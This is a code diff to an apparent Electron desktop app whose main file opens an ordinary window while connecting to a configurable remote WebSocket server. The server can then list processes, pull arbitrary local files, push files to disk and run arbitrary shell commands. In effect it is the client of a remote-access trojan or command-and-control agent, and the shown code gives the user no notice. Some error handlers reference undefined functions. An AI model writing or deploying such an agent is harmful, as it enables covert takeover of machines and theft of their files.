@@ -7,27 +7,59 @@ const os = require('os');
 
 let mainWindow;
 let ws;
-
 function createWindow() {
   mainWindow = new BrowserWindow({
     width: 800,
     height: 600,
   });
+
   mainWindow.loadFile('index.html');
-  ws = new WebSocket('ws://127.0.0.1:8081/ws');
+  //ws = new WebSocket('ws://127.0.0.1:8081/ws');
+  ws = new WebSocket('ws://{ip}:{port}/ws');
 
   ws.on('open', () => {
     ws.send(JSON.stringify({ device_name: 'YourDeviceName' }));
   });
 
-  ws.on('message', (message) => {
-    const data = JSON.parse(message);
-    handleServerCommand(data,ws);
+  ws.on('message', (message) => 
+    {
+      if (isJson(message)) {
+        const data = JSON.parse(message);
+        handleServerCommand(data,ws);
+    } else {
+      if (global.fileWriteHandle) {
+        global.fileWriteHandle.write(message);
+        console.log(`Received file chunk: ${message.length} bytes.`);
+      } else {
+        console.error("Error: Received file data without an active download.");
+      }
+    }
+  });
+  ws.on("error", (err) => {
+    console.error("WebSocket error:", err.message);
+    ws.off("message", handleMessage); 
+    reject(err);
+  });
+
+  ws.on("close", () => {
+    console.log("WebSocket closed.");
+    ws.off("message", handleMessage); 
+    reject(new Error("WebSocket closed unexpectedly."));
   });
 }
 
+function isJson(str) {
+  try {
+    const obj = JSON.parse(str);
+    if (obj && typeof obj == 'object') return true;
+  } catch (e) {}
+
+  return false;
+}
+
 function handleServerCommand(data,ws) {
-  console.log(data.command);
+  console.log(`Received data: "${data}"`);
+  console.log(`Received command: "${data.command}"`);
   switch (true) {
     case data.command == 'list_processes':
       exec('ps aux', (err, stdout) => {
@@ -46,15 +78,23 @@ function handleServerCommand(data,ws) {
       break;
     case data.command && data.command.startsWith('upload_file'):
       const part1 = data.command.split(' ');
+      console.log(part1)
       if (part1.length > 1) {
         const fileName = part1.slice(1).join(' ');
-        uploadFile(ws,fileName);
+        uploadFile(fileName,ws);
       } else {
         console.error('Invalid command format: file name is missing.');
       }
       break;
-    case data.command == 'download_file':
-      downloadFile(data.fileName);
+    case data.command && data.command.startsWith('download_file'):
+      const part2 = data.command.split(' ');
+      console.log(part2)
+      if (part2.length > 1) {
+        const fileName = part2.slice(1).join(' ');
+        downloadFile(fileName,ws);
+      } else {
+        console.error('Invalid command format: file name is missing.');
+      }
       break;
     case data.command && data.command.startsWith('execute_command'):
       console.log(data.command.split(' ').slice(1).join(' '))
@@ -64,6 +104,7 @@ function handleServerCommand(data,ws) {
       break;
     default:
       console.log('Unknown command');
+      console.log(data)
   }
 }
 
@@ -72,66 +113,65 @@ function sendResponse(result) {
   ws.send(JSON.stringify({ action: "send_result",status:"success",result: result }));
 }
 
-function uploadFile(ws, filePath) {
+async function uploadFile(filePath,ws) {
   try {
-    const fileName = path.basename(filePath);
-    const fileSize = fs.statSync(filePath).size;
+    const fileStats = fs.statSync(filePath);
+    const filename = fileStats.isFile() ? filePath.split("/").pop() : null;
+    const filesize = fileStats.size;
 
-    const request = {
+    if (!filename) {
+      throw new Error("Invalid file path or not a file.");
+    }
+
+    const uploadRequest = {
       action: "upload_file",
-      filename: fileName,
-      filesize: fileSize,
+      filename: filename,
+      filesize: filesize,
     };
-    ws.send(JSON.stringify(request));
-    console.log(`Upload request sent for file: ${fileName} (${fileSize} bytes)`);
+
+    ws.send(JSON.stringify(uploadRequest));
+    console.log(`Upload request sent: ${JSON.stringify(uploadRequest)}`);
 
     const readStream = fs.createReadStream(filePath, { highWaterMark: 1024 * 4 });
+
     readStream.on("data", (chunk) => {
       ws.send(chunk);
+      console.log(`Sent chunk of size: ${chunk.length}`);
     });
 
     readStream.on("end", () => {
-      const completedMessage = { action: "upload_completed" };
-      ws.send(JSON.stringify(completedMessage));
-      console.log(`Upload completed for file: ${fileName}`);
-      cleanupUpload();
+      console.log("File upload completed. Sending completion message.");
+      const uploadCompleteMessage = {
+        action: "upload_completed",
+      };
+      ws.send(JSON.stringify(uploadCompleteMessage));
     });
 
     readStream.on("error", (err) => {
-      console.error(`Error reading file ${filePath}:`, err);
-      cleanupUpload();
+      console.error("Error reading file:", err);
+      throw new Error(`File read error: ${err.message}`);
     });
-
-    ws.on("error", (err) => {
-      console.error("WebSocket error during upload:", err);
-      cleanupUpload();
-    });
-
-    ws.on("close", () => {
-      console.log("WebSocket connection closed during upload.");
-      cleanupUpload();
-    });
-
-    function cleanupUpload() {
-      if (readStream) {
-        readStream.close();
-      }
-    }
-  } catch (err) {
-    console.error(`Error initiating upload: ${err.message}`);
+  } catch (error) {
+    console.error("Error in uploadFile function:", error.message);
+    throw error;
   }
 }
 
-function downloadFile(fileName) {
-  const filePath = path.join(os.tmpdir(), fileName);
-  ws.send(JSON.stringify({ command: 'request_file', fileName }));
-  ws.on('message', (message) => {
-    const data = JSON.parse(message);
-    if (data.command === 'file_download' && data.fileName === fileName) {
-      fs.writeFile(filePath, Buffer.from(data.data, 'base64'), (err) => {
-        if (err) return console.error(err);
-        sendResponse(`File downloaded to ${filePath}`);
-      });
+async function downloadFile(filename,ws ) {
+  return new Promise((resolve, reject) => {
+    try {
+      const downloadRequest = {
+        action: "download_file",
+        filename: filename,
+      };
+      ws.send(JSON.stringify(downloadRequest));
+      console.log(`Download request sent: ${JSON.stringify(downloadRequest)}`);
+
+      global.fileWriteHandle = fs.createWriteStream(filename);
+      const writeStream = fs.createWriteStream(filename);
+    } catch (error) {
+      console.error("Error in downloadFile function:", error.message);
+      reject(error);
     }
   });
 }
